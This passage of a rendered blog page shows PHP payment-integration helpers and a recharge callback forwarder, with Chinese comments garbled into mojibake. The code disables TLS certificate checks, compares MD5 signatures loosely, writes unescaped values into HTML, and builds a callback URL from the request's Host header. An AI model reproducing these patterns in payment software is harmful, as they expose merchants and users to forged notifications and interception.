class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">httpRequest</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_CUSTOMREQUEST, <span class="string">&quot;POST&quot;</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">FALSE</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_USERAGENT, <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)&#x27;</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>,<span class="string">&#x27;Content-Length: &#x27;</span> . strlen(<span class="variable">$data</span>)));</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$tmpInfo</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (curl_errno(<span class="variable">$ch</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> curl_error(<span class="variable">$ch</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$tmpInfo</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *[payVerify æ”¯ä»˜ä»˜éªŒç­¾]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $result [è¿”å›çš„å‚æ•°]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> [type] $md5    [MD5]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">payVerify</span>(<span class="params"><span class="variable">$result</span>,<span class="variable">$md5</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$signStr</span> = <span class="variable">$result</span>[<span class="string">&#x27;sign&#x27;</span>];</span><br><span class="line">        <span class="variable">$sign_array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$k</span> !== <span class="string">&#x27;sign&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$sign_array</span>[<span class="variable">$k</span>] = <span class="variable">$v</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sign</span>  = md5(<span class="keyword">$this</span>-&gt;get_sign(<span class="variable">$sign_array</span>).<span class="variable">$md5</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$signStr</span> != <span class="variable">$sign</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">CurlQuery</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//è®¾ç½®é™„åŠ HTTPå¤´</span></span><br><span class="line">        <span class="variable">$addHead</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;Content-type: application/json&quot;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="variable">$curl_obj</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$curl_obj</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$curl_obj</span>, CURLOPT_HTTPHEADER, <span class="variable">$addHead</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$curl_obj</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$curl_obj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$curl_obj</span>, CURLOPT_TIMEOUT, <span class="number">15</span>);</span><br><span class="line">        <span class="variable">$result</span> = curl_exec(<span class="variable">$curl_obj</span>);</span><br><span class="line">        curl_close(<span class="variable">$curl_obj</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ ¹æ®é•¿ç½‘å€è·å–çŸ­ç½‘å€</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">shortUrl</span>(<span class="params"><span class="variable">$long_url</span>, <span class="variable">$appkey</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$long_url</span> = urlencode(<span class="variable">$long_url</span>);</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&#x27;http://mrw.so/api.php?format=json&amp;url=&#x27;</span> . <span class="variable">$long_url</span> . <span class="string">&#x27;&amp;key=&#x27;</span> . <span class="variable">$appkey</span> . <span class="string">&#x27;&amp;expireDate=&#x27;</span> . date(<span class="string">&quot;Y-m-d&quot;</span>,strtotime(<span class="string">&quot;+3 day&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è·å–è¯·æ±‚ç»“æœ</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;CurlQuery(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$json</span> = json_decode(<span class="variable">$result</span>);</span><br><span class="line">        <span class="comment">//å¼‚å¸¸æƒ…å†µè¿”å›false</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$json</span>-&gt;err) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$json</span>-&gt;url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æäº¤è¡¨å•æ•°æ®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $post_data è¡¨å•æäº¤æ•°æ®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $url è¡¨å•æäº¤æ¥å£</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">httpHtml</span>(<span class="params"><span class="variable">$post_data</span>, <span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$html</span> = <span class="string">&#x27;&lt;html&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$html</span> = <span class="string">&#x27;&lt;head&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;/head&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;body onLoad=&quot;document.dinpayForm.submit();&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;form id=&quot;payFrom&quot; name=&quot;dinpayForm&quot; method=&quot;get&quot; action=&quot;&#x27;</span> . <span class="variable">$url</span> . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$post_data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;&#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27;&quot; value=&quot;&#x27;</span> . <span class="variable">$value</span> . <span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;/body&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;/html&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è°ƒç”¨ç¬¬ä¸‰æ–¹æ¥å£ï¼Œæäº¤æ•°æ®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $url ç¬¬ä¸‰æ–¹æ¥å£url</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $postdata æäº¤æ•°æ®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array[]|mixed[] è¿”å›æ•°æ®</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">httpPost</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$url</span>, <span class="variable">$path</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">true</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_CAINFO, <span class="variable">$path</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER,<span class="keyword">array</span>(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>,<span class="string">&#x27;Content-Length:&#x27;</span> . strlen(<span class="variable">$data</span>)));</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$response</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;code&#x27;</span> =&gt; <span class="variable">$httpCode</span>, <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$response</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * [privateKeyStr ç§é’¥é’¥å­—ç¬¦ä¸²å¤„ç†]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $privatekey [description]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> [type]             [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">privateKeyStr</span>(<span class="params"><span class="variable">$privatekey</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$private_key</span> = <span class="string">&quot;-----BEGIN PRIVATE KEY-----\r\n&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (str_split(<span class="variable">$privatekey</span>,<span class="number">64</span>) <span class="keyword">as</span> <span class="variable">$str</span>)&#123;</span><br><span class="line">            <span class="variable">$private_key</span> .= <span class="variable">$str</span> . <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$private_key</span> .=<span class="string">&quot;-----END PRIVATE KEY-----&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * [decode ç§é’¥è§£å¯†]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $data       [å¾…è§£å¯†å­—ç¬¦ä¸²]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  [type] $privateKey [ç§é’¥]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> [type]             [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">privateDecrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$privateKey</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//è¯»å–ç§˜é’¥</span></span><br><span class="line">        <span class="variable">$pr_key</span> = openssl_pkey_get_private(<span class="variable">$privateKey</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pr_key</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æ‰“å¼€å¯†é’¥å‡ºé”™&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = base64_decode(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$crypto</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="comment">//åˆ†æ®µè§£å¯†</span></span><br><span class="line">        <span class="keyword">foreach</span> (str_split(<span class="variable">$data</span>, <span class="number">128</span>) <span class="keyword">as</span> <span class="variable">$chunk</span>) &#123;</span><br><span class="line">            openssl_private_decrypt(<span class="variable">$chunk</span>, <span class="variable">$decryptData</span>, <span class="variable">$pr_key</span>);</span><br><span class="line">            <span class="variable">$crypto</span> .= <span class="variable">$decryptData</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$crypto</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>rechargeNotifyå›è°ƒæ ¸å¿ƒä»£ç </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * desc: å¤„ç†çº¿ä¸Šæ”¯ä»˜æ— å‚æ•°è·¯ç”±æ”¯ä»˜å›è°ƒå¤„ç†æ–¹æ³•ï¼šé€šè¿‡urlè°ƒç”¨æ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œè·å–ç›¸å…³æ”¯ä»˜ç¡®è®¤ä¿¡æ¯åï¼Œé€šè¿‡curlè½¬å‘åˆ°å¸¦å‚æ•°è·¯ç”±çš„apiæ¥å£</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">define(<span class="string">&#x27;S_ROOT&#x27;</span>, dirname(<span class="keyword">__FILE__</span>) . DIRECTORY_SEPARATOR);</span><br><span class="line"><span class="comment">//require S_ROOT . &#x27;core&#x27; . DIRECTORY_SEPARATOR . &#x27;base.php&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>       = [];  <span class="comment">//æ”¯ä»˜å›è°ƒæ•°æ®</span></span><br><span class="line"><span class="variable">$payData</span>    = <span class="string">&#x27;&#x27;</span>;  <span class="comment">//æ”¯ä»˜å›ä¼ çš„æ”¯ä»˜å‚æ•°ï¼Œè§„å®šï¼šä½¿ç”¨&quot;_&quot;å°†æ”¯ä»˜åç§°ä¸æ”¯ä»˜IDè¿æ¥èµ·æ¥ï¼Œå¦‚å…„å¼Ÿæ”¯ä»˜ï¼š&#x27;xiongdi_123&#x27;</span></span><br><span class="line"><span class="variable">$payType</span>    = <span class="string">&#x27;&#x27;</span>;  <span class="comment">//æ”¯ä»˜ç±»å‹</span></span><br><span class="line"><span class="variable">$payment_id</span> = <span class="string">&#x27;&#x27;</span>;  <span class="comment">//æ”¯ä»˜æ–¹å¼ID</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸åŒçš„æ”¯ä»˜æ–¹å¼è·å–æ•°æ®çš„æ–¹å¼å¯èƒ½ä¸åŒï¼Œæ ¹æ®ä¸åŒçš„æ”¯ä»˜ï¼Œæ·»åŠ ä¸åŒçš„è·å–å›è°ƒæ•°æ®çš„æ–¹æ³•ï¼Œå¦‚ï¼š$_GET\$_POST\$_REQUEST\ï¼ˆphp://inputï¼‰</span></span><br><span class="line"><span class="variable">$postData</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);  <span class="comment">//è·å–postå‚æ•°å­—ç¬¦ä¸²ç±»å‹æ•°æ®</span></span><br><span class="line">payLog(<span class="string">&#x27;callbackRecharge.txt&#x27;</span>,print_r(<span class="variable">$postData</span>,<span class="literal">true</span>).<span class="string">&#x27;---23---&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ•°æ®å¤„ç†ï¼Œä¸åŒçš„æ”¯ä»˜æ–¹å¼ï¼Œå¯èƒ½æ•°æ®å¤„ç†æ–¹å¼ä¸åŒ</span></span><br><span class="line"><span class="keyword">if</span>  (!<span class="keyword">empty</span>(<span class="variable">$postData</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!simplexml_load_string(<span class="variable">$postData</span>, <span class="string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOCDATA)) &#123;</span><br><span class="line">       parse_str(<span class="variable">$postData</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$data</span> = json_decode(json_encode(simplexml_load_string(<span class="variable">$postData</span>, <span class="string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOCDATA)), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    payLog(<span class="string">&#x27;callbackRecharge.txt&#x27;</span>,print_r(<span class="variable">$postData</span>,<span class="literal">true</span>).<span class="string">&#x27;---20---&#x27;</span> . print_r(simplexml_load_string(<span class="variable">$postData</span>, <span class="string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOCDATA),<span class="literal">true</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_REQUEST</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payLog(<span class="string">&#x27;callbackRecharge.txt&#x27;</span>,print_r(<span class="variable">$data</span>,<span class="literal">true</span>).<span class="string">&#x27;---26---&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">    payLog(<span class="string">&#x27;callbackRecharge.txt&#x27;</span>, <span class="string">&#x27;å¼‚æ­¥å……å€¼æ¥å‚æ•°é€šçŸ¥æ•°æ®ï¼š&#x27;</span> . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));  <span class="comment">//æ—¥å¿—ï¼Œè®°å½•è½¬æ¥æ•°æ®</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="string">&#x27;pay_attach&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$payData</span> = explode(<span class="string">&#x27;_&#x27;</span>, <span class="variable">$data</span>[<span class="string">&#x27;pay_attach&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$payData</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$payType</span>    = <span class="variable">$payData</span>[<span class="number">0</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$payment_id</span> = <span class="variable">$payData</span>[<span class="number">1</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$data</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$payment_id</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    payLog(<span class="string">&#x27;curlRecharge.log&#x27;</span>, <span class="string">&#x27;å¼‚æ­¥å……å€¼urlè½¬æ¥å‚æ•°é€šçŸ¥æ•°æ®ï¼š&#x27;</span> . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));  <span class="comment">//æ—¥å¿—ï¼Œè®°å½•è½¬æ¥æ•°æ®</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = httpPostApi(<span class="variable">$data</span>, <span class="variable">$payment_id</span>);   <span class="comment">//å¼‚æ­¥å……å€¼é€šçŸ¥è½¬æ¥</span></span><br><span class="line">    payLog(<span class="string">&#x27;callbackRecharge.txt&#x27;</span>,print_r(<span class="variable">$ret</span>,<span class="literal">true</span>).<span class="string">&#x27;----73--&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ret</span>;  <span class="comment">//è¾“å‡ºç»“æœæ•°æ®</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å……å€¼å¼‚æ­¥è½¬æ¥æ¥å£è°ƒç”¨ï¼Œpostæ•°æ®è½¬å‘ï¼Œè¡¨å•æäº¤æ•°æ®åº“æ ¼å¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $payData  éœ€è¦è½¬å‘çš„æ•°æ®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int $paymentId  çº¿ä¸Šæ”¯ä»˜æ–¹å¼ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed|number   è¿”å›æ•°æ®</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">httpPostApi</span>(<span class="params"><span class="variable">$payData</span>, <span class="variable">$paymentId</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//è·¯ç”±apiæ¥å£</span></span><br><span class="line">    <span class="variable">$payUrl</span> = <span class="string">&quot;https://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="string">&quot;/?m=api&amp;c=recharge&amp;a=rechargeNotify&amp;payment_id=&quot;</span> . <span class="variable">$paymentId</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_URL, <span class="variable">$payUrl</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">false</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_POST, <span class="literal">true</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, http_build_query(<span class="variable">$payData</span>));</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line"></span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$httpCode</span> == <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ”¯ä»˜æ—¥å¿—</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $fileName æ–‡ä»¶å,å¦‚ï¼špayerror.logæˆ–è€…pay/error.log</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  array $data æ•°æ®</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">payLog</span>(<span class="params"><span class="variable">$fileName</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$pathLog</span> = S_ROOT . <span class="string">&#x27;caches&#x27;</span> . DIRECTORY_SEPARATOR . <span class="string">&#x27;log&#x27;</span> . DIRECTORY_SEPARATOR . <span class="variable">$fileName</span>;</span><br><span class="line">    <span class="keyword">if</span> (is_file(<span class="variable">$pathLog</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (filesize(<span class="variable">$pathLog</span>) &gt;= <span class="number">10000000</span>) &#123;</span><br><span class="line">            <span class="variable">$new_file</span> = dirname(<span class="variable">$pathLog</span>) . <span class="string">&#x27;/&#x27;</span> . date(<span class="string">&#x27;Y_m_d_H_i_s&#x27;</span>).<span class="string">&#x27;_&#x27;</span>  . basename(<span 